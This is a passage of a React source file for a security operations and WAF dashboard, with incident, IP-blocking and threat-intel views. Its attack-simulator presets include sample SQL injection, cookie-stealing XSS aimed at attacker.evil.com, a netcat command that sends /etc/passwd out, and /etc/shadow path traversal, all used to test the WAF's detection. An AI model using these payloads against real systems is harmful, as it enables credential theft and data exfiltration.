import React, { useState, useEffect } from 'react';
import {
  ShieldAlert,
  ShieldCheck,
  AlertTriangle,
  Flame,
  Search,
  Filter,
  RefreshCw,
  Lock,
  Unlock,
  Radio,
  FileText,
  Activity,
  CheckCircle2,
  XCircle,
  ExternalLink,
  ChevronRight,
  Eye,
  Zap,
  Clock,
  Send,
  Database,
  Globe,
  Plus,
} from 'lucide-react';
import { useAuth } from '../context/AuthContext';
import {
  SecOpsSummary,
  SecurityIncident,
  SecurityEvent,
  IpReputation,
  ThreatIntelIndicator,
} from '../types';

export const SecOpsPage: React.FC = () => {
  const { apiFetch } = useAuth();

  // Active Tab
  const [activeTab, setActiveTab] = useState<
    'incidents' | 'waf_ips' | 'threat_intel' | 'audit_events' | 'simulator'
  >('incidents');

  // Summary telemetry
  const [summary, setSummary] = useState<SecOpsSummary | null>(null);
  const [loadingSummary, setLoadingSummary] = useState(true);

  // Incidents
  const [incidents, setIncidents] = useState<SecurityIncident[]>([]);
  const [loadingIncidents, setLoadingIncidents] = useState(false);
  const [selectedIncident, setSelectedIncident] = useState<SecurityIncident | null>(null);
  const [filterIncStatus, setFilterIncStatus] = useState<string>('ALL');
  const [filterIncSeverity, setFilterIncSeverity] = useState<string>('ALL');
  const [newNote, setNewNote] = useState('');
  const [savingNote, setSavingNote] = useState(false);
  const [actionSuccess, setActionSuccess] = useState<string | null>(null);

  // IP Reputations
  const [ipReputations, setIpReputations] = useState<IpReputation[]>([]);
  const [loadingIps, setLoadingIps] = useState(false);
  const [filterIpStatus, setFilterIpStatus] = useState<string>('ALL');
  const [blockIpModal, setBlockIpModal] = useState<{ open: boolean; ip: string; isPerm: boolean }>({
    open: false,
    ip: '',
    isPerm: false,
  });
  const [blockReason, setBlockReason] = useState('Repeated suspicious activity detected');

  // Threat Intel
  const [threatIntel, setThreatIntel] = useState<ThreatIntelIndicator[]>([]);
  const [loadingTi, setLoadingTi] = useState(false);
  const [newIocModal, setNewIocModal] = useState(false);
  const [newIocType, setNewIocType] = useState('IP');
  const [newIocValue, setNewIocValue] = useState('');
  const [newIocActor, setNewIocActor] = useState('');
  const [newIocCampaign, setNewIocCampaign] = useState('');
  const [newIocConfidence, setNewIocConfidence] = useState(85);
  const [newIocDesc, setNewIocDesc] = useState('');

  // Security Events Audit
  const [events, setEvents] = useState<SecurityEvent[]>([]);
  const [loadingEvents, setLoadingEvents] = useState(false);
  const [filterEvCategory, setFilterEvCategory] = useState<string>('ALL');
  const [filterEvAction, setFilterEvAction] = useState<string>('ALL');
  const [searchEvIp, setSearchEvIp] = useState('');
  const [selectedEvent, setSelectedEvent] = useState<SecurityEvent | null>(null);

  // WAF Simulator
  const [simIp, setSimIp] = useState('198.51.100.99');
  const [simMethod, setSimMethod] = useState('POST');
  const [simPath, setSimPath] = useState('/api/resources/finance.csv/query');
  const [simPayload, setSimPayload] = useState("admin' UNION SELECT id, password_hash FROM users WHERE '1'='1");
  const [simulating, setSimulating] = useState(false);
  const [simResult, setSimResult] = useState<any | null>(null);

  // Preset Attack Vectors
  const attackPresets = [
    {
      name: 'SQL Injection (Union Exfiltration)',
      ip: '198.51.100.99',
      path: '/api/resources/finance.csv/query',
      method: 'POST',
      payload: "1' UNION SELECT id, password_hash, salt FROM users WHERE '1'='1",
      category: 'SQL_INJECTION',
    },
    {
      name: 'Cross-Site Scripting (Stored XSS)',
      ip: '203.0.113.120',
      path: '/api/requests/new',
      method: 'POST',
      payload: "<script>fetch('https://attacker.evil.com/steal?c=' + document.cookie)</script>",
      category: 'XSS',
    },
    {
      name: 'OS Command Injection (RCE probe)',
      ip: '192.0.2.144',
      path: '/api/tools/execute',
      method: 'POST',
      payload: "; cat /etc/passwd | nc evil-exfil.xyz 4444",
      category: 'COMMAND_INJECTION',
    },
    {
      name: 'Directory / Path Traversal',
      ip: '198.51.100.77',
      path: '/api/catalog/download?file=../../../../etc/shadow',
      method: 'GET',
      payload: "../../../../etc/shadow",
      category: 'PATH_TRAVERSAL',
    },
    {
      name: 'Known Threat Intel C2 IP (APT29)',
      ip: '198.51.100.42',
      path: '/api/resources/list',
      method: 'GET',
      payload: "status=active",
      category: 'THREAT_INTEL_IP',
    },
  ];

  // Loaders
  const fetchSummary = async () => {
    setLoadingSummary(true);
    try {
      const data = await apiFetch('/api/secops/summary');
      setSummary(data);
    } catch (err) {
      console.error('Failed to load secops summary:', err);
    } finally {
      setLoadingSummary(false);
    }
  };

  const fetchIncidents = async () => {
    setLoadingIncidents(true);
    try {
      let url = '/api/secops/incidents';
      const params: string[] = [];
      if (filterIncStatus !== 'ALL') params.push(`status=${filterIncStatus}`);
      if (filterIncSeverity !== 'ALL') params.push(`severity=${filterIncSeverity}`);
      if (params.length > 0) url += `?${params.join('&')}`;
      const data = await apiFetch(url);
      setIncidents(data.incidents || []);
    } catch (err) {
      console.error('Failed to load incidents:', err);
    } finally {
      setLoadingIncidents(false);
    }
  };

  const fetchIncidentDetails = async (id: string) => {
    try {
      const data = await apiFetch(`/api/secops/incidents/${id}`);
      setSelectedIncident(data);
    } catch (err) {
      console.error('Failed to load incident details:', err);
    }
  };

  const fetchIpReputations = async () => {
    setLoadingIps(true);
    try {
      let url = '/api/secops/ips';
      if (filterIpStatus !== 'ALL') url += `?status=${filterIpStatus}`;
      const data = await apiFetch(url);
      setIpReputations(data.ips || []);
    } catch (err) {
      console.error('Failed to load IP reputations:', err);
    } finally {
      setLoadingIps(false);
    }
  };

  const fetchThreatIntel = async () => {
    setLoadingTi(true);
    try {
      const data = await apiFetch('/api/secops/threat-intel');
      setThreatIntel(data.indicators || []);
    } catch (err) {
      console.error('Failed to load threat intel:', err);
    } finally {
      setLoadingTi(false);
    }
  };

  const fetchEvents = async () => {
    setLoadingEvents(true);
    try {
      let url = '/api/secops/events?limit=50';
      if (filterEvCategory !== 'ALL') url += `&category=${filterEvCategory}`;
      if (filterEvAction !== 'ALL') url += `&action=${filterEvAction}`;
      if (searchEvIp.trim()) url += `&source_ip=${searchEvIp.trim()}`;
      const data = await apiFetch(url);
      setEvents(data.events || []);
    } catch (err) {
      console.error('Failed to load security events:', err);
    } finally {
      setLoadingEvents(false);
    }
  };

  useEffect(() => {
    fetchSummary();
  }, []);

  useEffect(() => {
    if (activeTab === 'incidents') fetchIncidents();
    if (activeTab === 'waf_ips') fetchIpReputations();
    if (activeTab === 'threat_intel') fetchThreatIntel();
    if (activeTab === 'audit_events') fetchEvents();
  }, [activeTab, filterIncStatus, filterIncSeverity, filterIpStatus, filterEvCategory, filterEvAction]);

  // Actions
  const handleUpdateIncidentStatus = async (status: string) => {
    if (!selectedIncident) return;
    try {
      await apiFetch(`/api/secops/incidents/${selectedIncident.id}`, {
        method: 'PATCH',
        body: JSON.stringify({
          status,
          note: `Incident status updated to ${status} via SecOps console`,
        }),
      });
      setActionSuccess(`Incident updated to ${status}`);
      fetchIncidentDetails(selectedIncident.id);
      fetchIncidents();
      fetchSummary();
    } catch (err: any) {
      console.error(err);
    }
  };

  const handleAddIncidentNote = async () => {
    if (!selectedIncident || !newNote.trim()) return;
    setSavingNote(true);
    try {
      await apiFetch(`/api/secops/incidents/${selectedIncident.id}`, {
        method: 'PATCH',
        body: JSON.stringify({
          status: selectedIncident.status,
          note: newNote.trim(),
        }),
      });
      setNewNote('');
      fetchIncidentDetails(selectedIncident.id);
    } catch (err: any) {
      console.error(err);
    } finally {
      setSavingNote(false);
    }
  };

  const handleContainIncident = async () => {
    if (!selectedIncident) return;
    try {
      const res = await apiFetch(`/api/secops/incidents/${selectedIncident.id}/contain`, {
        method: 'POST',
        body: JSON.stringify({ action: 'isolate_ip' }),
      });
      setActionSuccess(res.message || 'Containment executed: IP isolated at WAF');
      fetchIncidentDetails(selectedIncident.id);
      fetchIncidents();
      fetchSummary();
    } catch (err: any) {
      console.error(err);
    }
  };

  const handleBlockIp = async () => {
    try {
      await apiFetch('/api/secops/ips/block', {
        method: 'POST',
        body: JSON.stringify({
          ip: blockIpModal.ip,
          reason: blockReason,
          is_permanent: blockIpModal.isPerm,
          duration_seconds: blockIpModal.isPerm ? null : 3600,
        }),
      });
      setBlockIpModal({ open: false, ip: '', isPerm: false });
      fetchIpReputations();
      fetchSummary();
      setActionSuccess(`IP ${blockIpModal.ip} successfully blocked at WAF layer.`);
    } catch (err: any) {
      console.error(err);
    }
  };

  const handleUnblockIp = async (ip: string) => {
    try {
      await apiFetch('/api/secops/ips/unblock', {
        method: 'POST',
        body: JSON.stringify({ ip, reason: 'Administrative clearance' }),
      });
      fetchIpReputations();
      fetchSummary();
      setActionSuccess(`IP ${ip} unblocked and restored to CLEAN.`);
    } catch (err: any) {
      console.error(err);
    }
  };

  const handleAllowlistIp = async (ip: string) => {
    try {
      await apiFetch('/api/secops/ips/allowlist', {
        method: 'POST',
        body: JSON.stringify({ ip, reason: 'Trusted corporate infrastructure' }),
      });
      fetchIpReputations();
      fetchSummary();
      setActionSuccess(`IP ${ip} added to allowlist.`);
    } catch (err: any) {
      console.error(err);
    }
  };

  const handleCreateIoc = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      await apiFetch('/api/secops/threat-intel', {
        method: 'POST',
        body: JSON.stringify({
          type: newIocType,
          value: newIocValue.trim(),
          threat_actor: newIocActor.trim() || null,
          campaign: newIocCampaign.trim() || null,
          confidence: Number(newIocConfidence),
          description: newIocDesc.trim(),
        }),
      });
      setNewIocModal(false);
      setNewIocValue('');
      setNewIocActor('');
      setNewIocCampaign('');
      setNewIocDesc('');
      fetchThreatIntel();
      fetchSummary();
      setActionSuccess('Indicator of Compromise added to threat database.');
    } catch (err: any) {
      console.error(err);
    }
  };

  const handleRunSimulation = async (preset?: any) => {
    setSimulating(true);
    setSimResult(null);
    const ip = preset ? preset.ip : simIp;
    const method = preset ? preset.method : simMethod;
    const path = preset ? preset.path : simPath;
    const payload = preset ? preset.payload : simPayload;

    if (preset) {
      setSimIp(preset.ip);
      setSimMethod(preset.method);
      setSimPath(preset.path);
      setSimPayload(preset.payload);
    }

    try {
      const res = await apiFetch('/api/secops/simulate', {
        method: 'POST',
        body: JSON.stringify({
          source_ip: ip,
          method,
          path,
          payload,
        }),
      });
      setSimResult(res);
      fetchSummary();
      if (activeTab === 'incidents') fetchIncidents();
    } catch (err: any) {
      console.error(err);
    } finally {
      setSimulating(false);
    }
  };

  const getSeverityBadge = (sev: string) => {
    switch (sev) {
      case 'CRITICAL':
        return <span className="status-badge bg-rose-900/60 text-rose-300 border border-rose-500/50">CRITICAL</span>;
      case 'HIGH':
        return <span className="status-badge bg-red-900/50 text-red-300 border border-red-500/40">HIGH</span>;
      case 'MEDIUM':
        return <span className="status-badge bg-amber-900/40 text-amber-300 border border-amber-500/40">MEDIUM</span>;
      default:
        return <span className="status-badge bg-slate-800 text-slate-300 border border-slate-600">LOW</span>;
    }
  };

  const getStatusBadge = (status: string) => {
    switch (status) {
      case 'NEW':
        return <span className="status-badge bg-blue-900/40 text-blue-300 border border-blue-500/40">NEW</span>;
      case 'INVESTIGATING':
        return <span className="status-badge bg-purple-900/40 text-purple-300 border border-purple-500/40">INVESTIGATING</span>;
      case 'CONTAINED':
        return <span className="status-badge bg-amber-900/40 text-amber-300 border border-amber-500/40">CONTAINED</span>;
      case 'RESOLVED':
        return <span className="status-badge bg-emerald-900/40 text-emerald-300 border border-emerald-500/40">RESOLVED</span>;
      case 'CLOSED':
        return <span className="status-badge bg-slate-800 text-slate-400 border border-slate-700">CLOSED</span>;
      default:
        return <span className="status-badge bg-slate-800 text-slate-300">{status}</span>;
    }
  };

  const getIpStatusBadge = (status: string) => {
    switch (status) {
      case 'PERM_BLOCKED':
        return <span className="status-badge bg-rose-950 text-rose-400 border border-rose-600 font-semibold">PERM BLOCKED</span>;
      case 'TEMP_BLOCKED':
        return <span className="status-badge bg-red-950 text-red-400 border border-red-500">TEMP BLOCKED</span>;
      case 'FLAGGED':
        return <span className="status-badge bg-amber-950 text-amber-400 border border-amber-600">FLAGGED</span>;
      case 'ALLOWLISTED':
        return <span className="status-badge bg-emerald-950 text-emerald-400 border border-emerald-600">ALLOWLISTED</span>;
      default:
        return <span className="status-badge bg-slate-800 text-slate-300 border border-slate-600">CLEAN</span>;
    }
  };

  return (
    <div className="page-container" id="secops-page">
      {/* Page Header */}
      <div className="page-header-row">
        <div>
          <div className="flex items-center gap-3">
            <h1 className="page-title">ServiceNow SecOps & WAF Defense Center</h1>
            <span className="bg-rose-950/70 border border-rose-600/50 text-rose-400 text-xs px-2.5 py-0.5 rounded-full font-mono uppercase tracking-wider font-semibold">
              Live Gateway Enforcement
            </span>
          </div>
          <p className="page-subtitle">
            Enterprise Security Incident Response (SIR), Threat Intelligence (TISC), WAF Payload Inspection, and Adaptive IP Containment.
          </p>
        </div>

        <button
          onClick={() => {
            fetchSummary();
            if (activeTab === 'incidents') fetchIncidents();
            if (activeTab === 'waf_ips') fetchIpReputations();
            if (activeTab === 'threat_intel') fetchThreatIntel();
            if (activeTab === 'audit_events') fetchEvents();
          }}
          className="btn-secondary flex items-center gap-2 text-xs py-2 px-3"
          title="Refresh telemetry"
        >
          <RefreshCw size={14} className={loadingSummary ? 'animate-spin' : ''} />
          Refresh SecOps
        </button>
      </div>

      {actionSuccess && (
        <div className="mb-4 p-3 bg-emerald-950/40 border border-emerald-500/40 rounded-lg text-emerald-200 text-sm flex items-center justify-between">
          <div className="flex items-center gap-2">
            <CheckCircle2 size={16} className="text-emerald-400" />
            <span>{actionSuccess}</span>
          </div>
          <button onClick={() => setActionSuccess(null)} className="text-emerald-400 hover:text-emerald-200 text-xs">
            ✕
          </button>
        </div>
      )}

      {/* KPI Summary Cards */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-4 mb-6">
        <div className="metric-card border-l-4 border-l-rose-600 bg-card p-4 rounded-xl shadow-sm">
          <div className="flex items-center justify-between text-muted text-xs font-semibold uppercase tracking-wider mb-1">
            <span>Active Incidents</span>
            <Flame size={16} className="text-rose-500" />
          </div>
          <div className="text-2xl font-bold text-primary">
            {loadingSummary ? '...' : summary?.active_incidents ?? 0}
          </div>
          <div className="text-xs text-rose-600 font-medium mt-1">ServiceNow SIR Queue</div>
        </div>

        <div className="metric-card border-l-4 border-l-red-500 bg-card p-4 rounded-xl shadow-sm">
          <div className="flex items-center justify-between text-muted text-xs font-semibold uppercase tracking-wider mb-1">
            <span>Blocked IPs</span>
            <Lock size={16} className="text-red-500" />
          </div>
          <div className="text-2xl font-bold text-primary">
            {loadingSummary ? '...' : summary?.blocked_ips ?? 0}
          </div>
          <div className="text-xs text-muted mt-1">WAF Layer Restricted</div>
        </div>

        <div className="metric-card border-l-4 border-l-amber-500 bg-card p-4 rounded-xl shadow-sm">
          <div className="flex items-center justify-between text-muted text-xs font-semibold uppercase tracking-wider mb-1">
            <span>Attacks Detected</span>
            <AlertTriangle size={16} className="text-amber-500" />
          </div>
          <div className="text-2xl font-bold text-primary">
            {loadingSummary ? '...' : summary?.attacks_detected ?? 0}
          </div>
          <div className="text-xs text-amber-600 font-medium mt-1">Risk Score &ge; 30</div>
        </div>

        <div className="metric-card border-l-4 border-l-blue-500 bg-card p-4 rounded-xl shadow-sm">
          <div className="flex items-center justify-between text-muted text-xs font-semibold uppercase tracking-wider mb-1">
            <span>Security Events</span>
            <Activity size={16} className="text-blue-500" />
          </div>
          <div className="text-2xl font-bold text-primary">
            {loadingSummary ? '...' : summary?.total_security_events ?? 0}
          </div>
          <div className="text-xs text-muted mt-1">Immutable WAF Audit Stream</div>
        </div>

        <div className="metric-card border-l-4 border-l-purple-500 bg-card p-4 rounded-xl shadow-sm">
          <div className="flex items-center justify-between text-muted text-xs font-semibold uppercase tracking-wider mb-1">
            <span>Threat Intel IoCs</span>
            <Radio size={16} className="text-purple-500" />
          </div>
          <div className="text-2xl font-bold text-primary">
            {loadingSummary ? '...' : summary?.active_threat_intel_count ?? 0}
          </div>
          <div className="text-xs text-purple-600 font-medium mt-1">Active Indicators</div>
        </div>
      </div>

      {/* Navigation Tabs */}
      <div className="tabs-nav-bar flex border-b border-border-subtle mb-6 gap-2">
        <button
          onClick={() => setActiveTab('incidents')}
          className={`tab-btn flex items-center gap-2 py-3 px-4 font-semibold text-sm border-b-2 transition-all ${
            activeTab === 'incidents'
              ? 'border-accent-crimson text-accent-crimson'
              : 'border-transparent text-secondary hover:text-primary'
          }`}
        >
          <Flame size={16} />
          <span>Security Incidents (SIR)</span>
        </button>

        <button
          onClick={() => setActiveTab('waf_ips')}
          className={`tab-btn flex items-center gap-2 py-3 px-4 font-semibold text-sm border-b-2 transition-all ${
            activeTab === 'waf_ips'
              ? 'border-accent-crimson text-accent-crimson'
              : 'border-transparent text-secondary hover:text-primary'
          }`}
        >
          <Lock size={16} />
          <span>IP Threat Monitor & WAF</span>
        </button>

        <button
          onClick={() => setActiveTab('threat_intel')}
          className={`tab-btn flex items-center gap-2 py-3 px-4 font-semibold text-sm border-b-2 transition-all ${
            activeTab === 'threat_intel'
              ? 'border-accent-crimson text-accent-crimson'
              : 'border-transparent text-secondary hover:text-primary'
          }`}
        >
          <Radio size={16} />
          <span>Threat Intelligence (TISC)</span>
        </button>

        <button
          onClick={() => setActiveTab('audit_events')}
          className={`tab-btn flex items-center gap-2 py-3 px-4 font-semibold text-sm border-b-2 transition-all ${
            activeTab === 'audit_events'
              ? 'border-accent-crimson text-accent-crimson'
              : 'border-transparent text-secondary hover:text-primary'
          }`}
        >
          <FileText size={16} />
          <span>WAF Security History</span>
        </button>

        <button
          onClick={() => setActiveTab('simulator')}
          className={`tab-btn flex items-center gap-2 py-3 px-4 font-semibold text-sm border-b-2 transition-all ${
            activeTab === 'simulator'
              ? 'border-accent-crimson text-accent-crimson'
              : 'border-transparent text-secondary hover:text-primary'
          }`}
        >
          <Zap size={16} />
          <span>Live Attack Simulator</span>
        </button>
      </div>

      {/* TAB 1: SECURITY INCIDENTS (SIR) */}
      {activeTab === 'incidents' && (
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Incidents Table */}
          <div className={selectedIncident ? 'lg:col-span-2' : 'lg:col-span-3'}>
            <div className="card p-5 rounded-xl border border-border-subtle bg-card shadow-sm">
              <div className="flex flex-wrap items-center justify-between gap-3 mb-4">
                <div className="flex items-center gap-2">
                  <h2 className="text-base font-bold text-primary">ServiceNow Security Incidents</h2>
                  <span className="text-xs bg-bg-subtle text-secondary px-2 py-0.5 rounded-full font-mono">
                    {incidents.length} Records
                  </span>
                </div>

                <div className="flex items-center gap-3">
                  <select
                    value={filterIncStatus}
                    onChange={(e) => setFilterIncStatus(e.target.value)}
                    className="input-select text-xs py-1.5 px-2 rounded-lg border border-border-subtle"
                    aria-label="Filter by Status"
                  >
                    <option value="ALL">All Statuses</option>
                    <option value="NEW">New</option>
                    <option value="INVESTIGATING">Investigating</option>
                    <option value="CONTAINED">Contained</option>
                    <option value="RESOLVED">Resolved</option>
                    <option value="CLOSED">Closed</option>
                  </select>

                  <select
                    value={filterIncSeverity}
                    onChange={(e) => setFilterIncSeverity(e.target.value)}
                    className="input-select text-xs py-1.5 px-2 rounded-lg border border-border-subtle"
                    aria-label="Filter by Severity"
                  >
                    <option value="ALL">All Severities</option>
                    <option value="CRITICAL">Critical</option>
                    <option value="HIGH">High</option>
                    <option value="MEDIUM">Medium</option>
                    <option value="LOW">Low</option>
                  </select>
                </div>
              </div>

              {loadingIncidents ? (
                <div className="p-8 text-center text-muted">Loading Security Incidents...</div>
              ) : incidents.length === 0 ? (
                <div className="p-8 text-center text-muted">
                  <ShieldCheck size={36} className="mx-auto mb-2 text-emerald-500 opacity-60" />
                  <p>No security incidents match the selected filters.</p>
                </div>
              ) : (
                <div className="overflow-x-auto">
                  <table className="w-full text-left text-xs border-collapse">
                    <thead>
                      <tr className="border-b border-border-subtle text-muted uppercase font-semibold">
                        <th className="py-2.5 px-3">Incident #</th>
                        <th className="py-2.5 px-3">Title</th>
                        <th className="py-2.5 px-3">Severity</th>
                        <th className="py-2.5 px-3">Priority</th>
                        <th className="py-2.5 px-3">Status</th>
                        <th className="py-2.5 px-3">Attacker IP</th>
                        <th className="py-2.5 px-3">Created</th>
                        <th className="py-2.5 px-3 text-right">Actions</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-border-subtle">
                      {incidents.map((inc) => (
                        <tr
                          key={inc.id}
                          onClick={() => fetchIncidentDetails(inc.id)}
                          className={`cursor-pointer hover:bg-bg-subtle/40 transition-colors ${
                            selectedIncident?.id === inc.id ? 'bg-accent-crimson-light/20 font-medium' : ''
                          }`}
                        >
                          <td className="py-3 px-3 font-mono font-bold text-accent-crimson">{inc.id}</td>
                          <td className="py-3 px-3 max-w-[220px] truncate" title={inc.title}>
                            {inc.title}
                          </td>
                          <td className="py-3 px-3">{getSeverityBadge(inc.severity)}</td>
                          <td className="py-3 px-3">
                            <span className="font-mono font-semibold px-2 py-0.5 rounded bg-bg-subtle text-secondary">
                              {inc.priority}
                            </span>
                          </td>
                          <td className="py-3 px-3">{getStatusBadge(inc.status)}</td>
                          <td className="py-3 px-3 font-mono text-secondary">{inc.source_ip}</td>
                          <td className="py-3 px-3 text-muted">
                            {new Date(inc.created_at).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                          </td>
                          <td className="py-3 px-3 text-right">
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                fetchIncidentDetails(inc.id);
                              }}
                              className="btn-link text-xs flex items-center gap-1 justify-end"
                            >
                              Inspect <ChevronRight size={13} />
                            </button>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              )}
            </div>
          </div>

          {/* Incident Detail / Investigation Drawer */}
          {selectedIncident && (
            <div className="lg:col-span-1">
              <div className="card p-5 rounded-xl border border-accent-crimson/30 bg-card shadow-md sticky top-4">
                <div className="flex items-center justify-between pb-3 border-b border-border-subtle">
                  <div>
                    <span className="text-xs font-mono text-accent-crimson font-bold block">{selectedIncident.id}</span>
                    <h3 className="text-sm font-bold text-primary mt-0.5">{selectedIncident.title}</h3>
                  </div>
                  <button
                    onClick={() => setSelectedIncident(null)}
                    className="text-muted hover:text-primary text-sm font-bold"
                  >
                    ✕
                  </button>
                </div>

                <div className="py-3 border-b border-border-subtle flex flex-wrap gap-2 items-center text-xs">
                  {getSeverityBadge(selectedIncident.severity)}
                  {getStatusBadge(selectedIncident.status)}
                  <span className="bg-bg-subtle text-secondary px-2 py-0.5 rounded font-mono">
                    Priority: {selectedIncident.priority}
                  </span>
                </div>

                <div className="py-3 border-b border-border-subtle text-xs space-y-2">
                  <div>
                    <span className="text-muted block">Attacking Source IP:</span>
                    <span className="font-mono font-bold text-rose-600 text-sm">{selectedIncident.source_ip}</span>
                  </div>
                  <div>
                    <span className="text-muted block">Incident Description:</span>
                    <p className="text-secondary mt-0.5">{selectedIncident.description}</p>
                  </div>
                </div>

                {/* SOAR Action: Instant Containment */}
                <div className="py-3 border-b border-border-subtle">
                  <div className="text-xs font-bold text-primary mb-2 flex items-center gap-1.5">
                    <Zap size={14} className="text-amber-500" />
                    <span>SOAR Response Actions</span>
                  </div>
                  <button
                    onClick={handleContainIncident}
                    disabled={selectedIncident.status === 'CONTAINED' || selectedIncident.status === 'CLOSED'}
                    className="btn-danger w-full py-2 px-3 text-xs flex items-center justify-center gap-2 rounded-lg font-semibold"
                  >
                    <Lock size={14} />
                    <span>Isolate IP at WAF Gateway</span>
                  </button>
                  <p className="text-[11px] text-muted mt-1">
                    Instantly restricts all traffic from {selectedIncident.source_ip} across all API routes.
                  </p>
                </div>

                {/* Status Transitions */}
                <div className="py-3 border-b border-border-subtle">
                  <label className="text-xs font-bold text-primary block mb-2">ServiceNow State Progression</label>
                  <div className="grid grid-cols-2 gap-2">
                    {['INVESTIGATING', 'CONTAINED', 'RESOLVED', 'CLOSED'].map((st) => (
                      <button
                        key={st}
                        onClick={() => handleUpdateIncidentStatus(st)}
                        disabled={selectedIncident.status === st}
                        className={`text-xs py-1.5 px-2 rounded-lg border font-medium transition-all ${
                          selectedIncident.status === st
                            ? 'bg-accent-crimson text-white border-accent-crimson'
                            : 'bg-bg-subtle text-secondary hover:border-accent-crimson/40'
                        }`}
                      >
                        {st}
                      </button>
                    ))}
                  </div>
                </div>

                {/* Investigation Notes Thread */}
                <div className="py-3">
                  <div className="text-xs font-bold text-primary mb-2 flex items-center justify-between">
                    <span>Investigation Thread</span>
                    <span className="text-muted font-mono">{selectedIncident.investigation_notes?.length || 0}</span>
                  </div>

                  <div className="max-h-48 overflow-y-auto space-y-2 mb-3 pr-1">
                    {(selectedIncident.investigation_notes || []).length === 0 ? (
                      <p className="text-xs text-muted italic">No investigation notes entered yet.</p>
                    ) : (
                      selectedIncident.investigation_notes?.map((n) => (
                        <div key={n.note_id} className="p-2.5 rounded-lg bg-bg-subtle text-xs border border-border-subtle">
                          <div className="flex items-center justify-between text-muted text-[10px] mb-1">
                            <span className="font-semibold text-accent-crimson">{n.author}</span>
                            <span>{new Date(n.timestamp).toLocaleTimeString()}</span>
                          </div>
                          <p className="text-secondary leading-snug">{n.text}</p>
                        </div>
                      ))
                    )}
                  </div>

                  <div className="flex gap-2">
                    <input
                      type="text"
                      placeholder="Add investigation note..."
                      value={newNote}
                      onChange={(e) => setNewNote(e.target.value)}
                      onKeyDown={(e) => e.key === 'Enter' && handleAddIncidentNote()}
                      className="input-text text-xs flex-1 py-1.5 px-2.5 rounded-lg border border-border-subtle"
                    />
                    <button
                      onClick={handleAddIncidentNote}
                      disabled={savingNote || !newNote.trim()}
                      className="btn-primary py-1.5 px-3 text-xs rounded-lg"
                    >
                      <Send size={13} />
                    </button>
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>
      )}

      {/* TAB 2: IP THREAT MONITOR & WAF CONTROLS */}
      {activeTab === 'waf_ips' && (
        <div className="card p-5 rounded-xl border border-border-subtle bg-card shadow-sm">
          <div className="flex flex-wrap items-center justify-between gap-3 mb-5">
            <div>
              <h2 className="text-base font-bold text-primary">IP Threat Monitoring & WAF Restrictions</h2>
              <p className="text-xs text-muted mt-0.5">
                Dynamic and manual IP blocking enforced at the gateway middleware layer with trusted proxy resolution.
              </p>
            </div>

            <div className="flex items-center gap-3">
              <select
                value={filterIpStatus}
                onChange={(e) => setFilterIpStatus(e.target.value)}
                className="input-select text-xs py-1.5 px-2.5 rounded-lg border border-border-subtle"
                aria-label="Filter IP Status"
              >
                <option value="ALL">All IP States</option>
                <option value="PERM_BLOCKED">Permanently Blocked</option>
                <option value="TEMP_BLOCKED">Temporarily Blocked</option>
                <option value="FLAGGED">Flagged</option>
                <option value="ALLOWLISTED">Allowlisted</option>
                <option value="CLEAN">Clean</option>
              </select>

              <button
                onClick={() => setBlockIpModal({ open: true, ip: '', isPerm: false })}
                className="btn-danger flex items-center gap-1.5 text-xs py-2 px-3 rounded-lg font-semibold"
              >
                <Lock size={14} />
                <span>Manual Block IP</span>
              </button>
            </div>
          </div>

          {loadingIps ? (
            <div className="p-8 text-center text-muted">Loading IP Reputations...</div>
          ) : ipReputations.length === 0 ? (
            <div className="p-8 text-center text-muted">
              <ShieldCheck size={36} className="mx-auto mb-2 text-emerald-500 opacity-60" />
              <p>No tracked IP records found for this filter.</p>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs border-collapse">
                <thead>
                  <tr className="border-b border-border-subtle text-muted uppercase font-semibold">
                    <th className="py-2.5 px-3">IP Address</th>
                    <th className="py-2.5 px-3">WAF Status</th>
                    <th className="py-2.5 px-3">Risk Score</th>
                    <th className="py-2.5 px-3">Malicious Attempts</th>
                    <th className="py-2.5 px-3">Block Expiry</th>
                    <th className="py-2.5 px-3">Reason / Details</th>
                    <th className="py-2.5 px-3">Override</th>
                    <th className="py-2.5 px-3 text-right">Actions</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-border-subtle">
                  {ipReputations.map((rep) => (
                    <tr key={rep.ip} className="hover:bg-bg-subtle/30 transition-colors">
                      <td className="py-3 px-3 font-mono font-bold text-primary">{rep.ip}</td>
                      <td className="py-3 px-3">{getIpStatusBadge(rep.status)}</td>
                      <td className="py-3 px-3">
                        <div className="flex items-center gap-2">
                          <div className="w-16 bg-bg-subtle rounded-full h-2 overflow-hidden">
                            <div
                              className={`h-full ${
                                rep.risk_score >= 80
                                  ? 'bg-rose-600'
                                  : rep.risk_score >= 40
                                  ? 'bg-amber-500'
                                  : 'bg-emerald-500'
                              }`}
                              style={{ width: `${Math.min(rep.risk_score, 100)}%` }}
                            />
                          </div>
                          <span className="font-mono text-[11px] text-muted">{rep.risk_score}</span>
                        </div>
                      </td>
                      <td className="py-3 px-3 font-mono font-bold text-rose-600">{rep.malicious_attempts}</td>
                      <td className="py-3 px-3 text-muted">
                        {rep.blocked_until ? new Date(rep.blocked_until).toLocaleTimeString() : '—'}
                      </td>
                      <td className="py-3 px-3 max-w-[200px] truncate text-secondary" title={rep.block_reason || ''}>
                        {rep.block_reason || 'Standard inspection'}
                      </td>
                      <td className="py-3 px-3">
                        {rep.manual_override ? (
                          <span className="text-[10px] bg-amber-900/40 text-amber-300 border border-amber-500/40 px-1.5 py-0.5 rounded font-mono">
                            Admin
                          </span>
                        ) : (
                          <span className="text-[10px] text-muted font-mono">Auto</span>
                        )}
                      </td>
                      <td className="py-3 px-3 text-right space-x-2">
                        {rep.status === 'PERM_BLOCKED' || rep.status === 'TEMP_BLOCKED' ? (
                          <button
                            onClick={() => handleUnblockIp(rep.ip)}
                            className="btn-link text-emerald-600 hover:text-emerald-500 text-xs inline-flex items-center gap-1"
                          >
                            <Unlock size={12} />
                            Unblock
                          </button>
                        ) : (
                          <button
                            onClick={() => setBlockIpModal({ open: true, ip: rep.ip, isPerm: false })}
